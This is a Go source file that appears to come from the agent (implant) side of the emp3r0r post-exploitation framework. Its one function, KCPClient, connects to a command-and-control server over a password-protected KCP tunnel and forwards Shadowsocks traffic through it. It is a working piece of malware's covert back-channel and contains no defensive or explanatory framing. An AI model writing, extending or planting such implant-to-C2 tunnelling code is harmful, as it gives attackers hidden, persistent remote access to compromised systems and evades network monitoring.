package agent

import (
	"fmt"
	"log"

	emp3r0r_data "github.com/jm33-m0/emp3r0r/core/lib/data"
	"github.com/jm33-m0/emp3r0r/core/lib/tun"
)

// Connect to C2 KCP server, forward Shadowsocks traffic
func KCPClient() {
	if !RuntimeConfig.UseKCP {
		return
	}
	kcp_server_addr := fmt.Sprintf("%s:%s", RuntimeConfig.CCHost, RuntimeConfig.KCPServerPort)
	err := tun.KCPTunClient(kcp_server_addr, RuntimeConfig.KCPClientPort,
		RuntimeConfig.Password, emp3r0r_data.MagicString)
	if err != nil {
		log.Printf("KCPTUN failed to start: %v", err)
	}
}
